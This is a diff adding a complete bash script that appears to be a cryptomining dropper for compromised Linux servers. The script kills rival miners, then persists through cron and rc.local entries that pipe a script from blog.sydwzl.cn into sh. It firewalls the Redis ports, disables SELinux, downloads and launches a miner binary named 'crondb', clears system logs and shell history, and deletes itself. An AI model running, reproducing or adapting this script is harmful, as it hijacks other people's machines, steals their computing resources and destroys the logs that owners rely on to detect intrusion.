@@ -1,0 +1,149 @@
+#!/bin/bash
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+ps x | awk '!/awk/ && /redis-server/ {print $1}' | xargs kill -9 2>/dev/null
+ps x | awk '!/awk/ && /linuxs|linuxl|crawler\.weibo/ {print $1}' | xargs kill -9 2>/dev/null
+ps x | awk '!/awk/ && /243\/44444|cryptonight|stratum|gpg-daemon|jobs\.flu\.cc|nmap/ {print $1}' | xargs kill -9 2>/dev/null
+ps x | awk '!/awk/ && /cranberry|start\.sh|watch\.sh|krun\.sh|killTop\.sh|cpuminer|\/60009|ssh_deny\.sh|clean\.sh/ {print $1}' | xargs kill -9 2>/dev/null
+ps x | awk '!/awk/ && /\.\/over|mrx1/ {print $1}' | xargs kill -9 2>/dev/null
+ps x | awk '!/awk/ && /redisscan|ebscan|redis-cli/ {print $1}' | xargs kill -9 2>/dev/null
+ps x | awk '!/awk/ && /barad_agent|\.sr0|gpg-agentd|clay|udevs|kworkers|\.sshd|\/tmp\/init/ {print $1}' | xargs kill -9 2>/dev/null
+sleep 1
+pkill -f AnXqV.yam
+ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
+ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
+ps ax|grep -o './[0-9]* -c'| xargs pkill -f
+pkill -f biosetjenkins
+pkill -f Loopback
+pkill -f apaceha
+pkill -f cryptonight
+pkill -f stratum
+pkill -f mixnerdx
+pkill -f performedl
+pkill -f JnKihGjn
+pkill -f irqba2anc1
+pkill -f irqba5xnc1
+pkill -f irqbnc1
+pkill -f ir29xc1
+pkill -f conns
+pkill -f irqbalance
+pkill -f crypto-pool
+pkill -f minexmr
+pkill -f XJnRj
+pkill -f NXLAi
+pkill -f BI5zj
+pkill -f askdljlqw
+pkill -f minerd
+pkill -f minergate
+pkill -f Guard.sh
+pkill -f ysaydh
+pkill -f bonns
+pkill -f donns
+pkill -f kxjd
+pkill -f Duck.sh
+pkill -f bonn.sh
+pkill -f conn.sh
+pkill -f kworker34
+pkill -f kw.sh
+pkill -f pro.sh
+pkill -f polkitd
+pkill -f crondb
+pkill -f acpid
+pkill -f icb5o
+pkill -f nopxi
+pkill -f irqbalanc1
+pkill -f minerd
+pkill -f i586
+pkill -f gddr
+pkill -f mstxmr
+pkill -f ddg.2011
+pkill -f wnTKYg
+pkill -f deamon
+pkill -f disk_genius
+pkill -f sourplum
+CRON () {
+  if [ -x /usr/bin/wget ] ; then
+        echo '0 3 * * * wget -q -O- http://blog.sydwzl.cn/bar.sh | sh' > /tmp/.bla.cron
+        echo 'wget -q -O- http://blog.sydwzl.cn/bar.sh | sh' > /etc/rc.local
+    elif [ -x /usr/bin/curl ] ; then
+        echo '0 3 * * * curl -fsSL http://blog.sydwzl.cn/bar.sh | sh' > /tmp/.bla.cron
+        echo 'curl -fsSL http://blog.sydwzl.cn/bar.sh | sh' > /etc/rc.local
+    fi
+    
+    crontab /tmp/.bla.cron
+    rm -f /tmp/.bla.cron
+    echo 'exit 0' >> /etc/rc.local
+}
+FIRE () {
+iptables -I INPUT 1 -p tcp --match multiport --dports 6370:7006 -j DROP 2>/dev/null
+iptables -I INPUT 1 -p tcp --match multiport --dports 6370:7006 -s 127.0.0.1 -j ACCEPT 2>/dev/null
+sleep 1
+echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
+sleep 1
+cat <<EOF> /etc/security/limits.conf
+*         hard    nofile      25000
+*         soft    nofile      25000
+root      hard    nofile      25000
+root      soft    nofile      25000
+EOF
+}
+PSCAN () {
+if [ ! -x "/tmp/crondb" ];then
+    chmod +x /tmp/crondb
+fi
+PS0=$(ps aux | grep crondb | grep -v "grep" | wc -l)
+if [ $PS0 -eq 1 ];then
+    return
+elif [ $PS0 -eq 0 ];then
+   nohup /tmp/crondb  -C /tmp/pools.txt>/dev/null 2>&1 &
+elif [ $PS0 -gt 1 ];then
+    pkill -f crondb
+    nohup /tmp/crondb  -C /tmp/pools.txt>/dev/null 2>&1 &
+fi
+echo 0 > /var/spool/mail/root
+echo 0 > /var/log/wtmp
+echo 0 > /var/log/secure
+echo 0 > /root/.bash_history
+history  -c 
+}
+DOWNLOAD () {
+if [ ! -f "/tmp/crondb" ];then
+    if [ -x /usr/bin/wget ];then
+        wget http://blog.sydwzl.cn/crondb -O /tmp/crondb && chmod +x /tmp/crondb && wget http://blog.sydwzl.cn/pools.txt -O /tmp/pools.txt
+		nohup /tmp/bashe  -C /tmp/pools.txt>/dev/null 2>&1 &
+        #wget http://$HOST/crondb -O /tmp/crondb && chmod +x /tmp/crondb && wget http://$HOST/c.j -O /tmp/c.j
+    elif [ -x /usr/bin/curl ];then
+        #curl http://$HOST/crondb -o /tmp/crondb && chmod +x /tmp/crondb && curl http://$HOST/c.j -o /tmp/c.j
+        curl http://blog.sydwzl.cn/crondb -o /tmp/crondb && chmod +x /tmp/crondb && curl http://blog.sydwzl.cn/pools.txt -o /tmp/pools.txt
+		nohup /tmp/bashe  -C /tmp/pools.txt>/dev/null 2>&1 &
+    fi
+fi
+echo 0 > /var/spool/mail/root
+echo 0 > /var/log/wtmp
+echo 0 > /var/log/secure
+echo 0 > /root/.bash_history
+history  -c 
+}
+FIRE
+CRON
+DOWNLOAD
+PSCAN
+
+echo 0 > /var/spool/mail/root
+echo 0 > /var/log/wtmp
+echo 0 > /var/log/secure
+echo 0 > /root/.bash_history
+rm -rf $0 
+history  -c
+exit 0
